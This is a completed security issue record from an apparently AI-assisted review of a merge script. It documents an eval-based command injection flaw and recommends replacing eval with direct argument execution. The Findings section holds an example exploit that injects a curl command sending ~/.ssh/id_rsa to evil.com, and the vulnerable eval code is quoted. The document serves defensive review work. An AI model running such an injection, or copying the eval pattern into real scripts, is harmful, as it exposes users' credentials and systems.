---
status: completed
priority: p0
issue_id: "001"
tags: [code-review, security, pr-101, command-injection]
dependencies: []
completed_date: 2025-10-16
---

# Command Injection via eval in workflow-merge.sh

## Problem Statement

The `execute_command()` function in `scripts/workflow-merge.sh` uses `eval` to execute shell commands, creating a critical command injection vulnerability. User-supplied PR numbers and other inputs flow through this function without sanitization, allowing arbitrary command execution.

**CVSS Score:** 9.8 (Critical)
**CWE:** CWE-78 (OS Command Injection)

## Findings

- Discovered during comprehensive code review by security-sentinel agent
- Location: `scripts/workflow-merge.sh:146`
- Affects all command executions in the script (15+ call sites)
- Attack vector: Malicious PR number or branch name can inject shell commands
- Example exploit: `/merge "123; curl evil.com/exfil?data=$(cat ~/.ssh/id_rsa)"`

### Vulnerable Code
```bash
execute_command() {
    if [[ "$DRY_RUN" == "true" ]]; then
        echo "  [DRY RUN] Would execute: $1"
        return 0
    else
        if [[ "$VERBOSE" == "true" ]]; then
            echo "  Executing: $1"
        fi
        eval "$1"  # ← CRITICAL VULNERABILITY
    fi
}
```

### Impact Analysis
- **Confidentiality:** HIGH - Can exfiltrate sensitive data (SSH keys, environment variables)
- **Integrity:** HIGH - Can modify or delete files, corrupt repository
- **Availability:** HIGH - Can terminate processes, fill disk space
- **Scope:** System-wide - Executes with user's full privileges

## Proposed Solutions

### Option 1: Direct Execution (Recommended)
- **Pros**: Eliminates eval entirely, most secure approach, aligns with bash best practices
- **Cons**: Requires refactoring all 15+ call sites
- **Effort**: Medium (2-3 hours)
- **Risk**: Low - Well-tested pattern

**Implementation:**
```bash
# SECURE APPROACH: Direct execution without eval
execute_command() {
    if [[ "$DRY_RUN" == "true" ]]; then
        printf '  [DRY RUN] Would execute: %q' "$@"; echo
        return 0
    fi
    if [[ "$VERBOSE" == "true" ]]; then
        printf '  Executing: %q' "$@"; echo
    fi
    "$@"  # Execute arguments directly
}

# Update all callers to use array format:
# Before: execute_command "gh pr merge \"$PR_NUMBER\" --merge"
# After:  execute_command gh pr merge "$PR_NUMBER" --merge
```

### Option 2: Command Allowlist (Alternative)
- **Pros**: Keeps eval for compatibility, adds validation layer
- **Cons**: Incomplete protection, still risky, harder to maintain
- **Effort**: Small (1 hour)
- **Risk**: Medium - Can be bypassed if allowlist incomplete

**Implementation:**
```bash
execute_command() {
    local cmd="${1%% *}"
    case "$cmd" in
        git|gh|cd) ;;  # Allowed commands only
        *) echo "ERROR: Unauthorized command: $cmd" >&2; return 1 ;;
    esac

    if [[ "$DRY_RUN" != "true" ]]; then
        eval "$1"
    fi
}
```

## Recommended Action

**Option 1: Direct Execution** - This is the only secure approach that eliminates the vulnerability entirely.

### Implementation Steps
1. Refactor `execute_command()` to use `"$@"` instead of `eval "$1"`
2. Update all call sites (approximately 15 locations):
   - Line 418: Merge execution
   - Line 427: Branch merge with strategy
   - Line 512: Directory change
   - Line 521: Git fetch
   - Line 524: Git pull
   - Line 532: Checkout main
   - Line 542: Worktree removal
   - Line 545: Worktree prune
3. Test all execution paths in both dry-run and actual execution modes
4. Verify no shell metacharacter expansion issues

## Technical Details

**Affected Files:**
- `scripts/workflow-merge.sh` (primary)
- All callers of `execute_command()`

**Related Components:**
- PR merge workflow
- Worktree cleanup logic
- Git operations

**Database Changes:** None

## Resources

- Code review PR: https://github.com/carmandale/agent-os/pull/101
- Security review findings: See comprehensive security audit report
- Related security issues: Command injection (CWE-78), Input validation (CWE-20)
- OWASP reference: https://owasp.org/www-community/attacks/Command_Injection

## Acceptance Criteria

- [ ] `execute_command()` function refactored to use direct execution (`"$@"`)
- [ ] All 15+ call sites updated to array-based argument passing
- [ ] No use of `eval` anywhere in the script
- [ ] Dry-run mode works correctly with new implementation
- [ ] Verbose mode displays commands without exposing to injection
- [ ] All tests pass (manual execution of merge workflow)
- [ ] Code reviewed for any remaining eval usage
- [ ] Security review confirms vulnerability resolved

## Work Log

### 2025-10-15 - Code Review Discovery
**By:** Claude Code Review System (security-sentinel agent)
**Actions:**
- Discovered during comprehensive multi-agent code review of PR #101
- Analyzed by security-sentinel, pattern-recognition-specialist, and architecture-strategist agents
- Categorized as P0 blocking issue for merge approval
- Created todo for tracking and resolution

**Learnings:**
- eval usage is a common source of command injection vulnerabilities
- Agent OS scripts should follow secure bash patterns
- Input validation alone is insufficient; eliminate eval entirely
- Direct execution with proper quoting is the secure alternative

## Notes

**BLOCKING:** This issue MUST be resolved before PR #101 can be merged to main.

**Context:** Part of comprehensive security review that identified 3 critical, 7 high, 8 medium, and 6 low severity issues in the `/merge` command implementation.

**Related Findings:**
- Issue #002: Insufficient input validation on PR numbers (P0)
- Issue #003: Path traversal in worktree operations (P0)

Source: Code review performed on 2025-10-15
Review command: `/compounding-engineering:review PR #101`
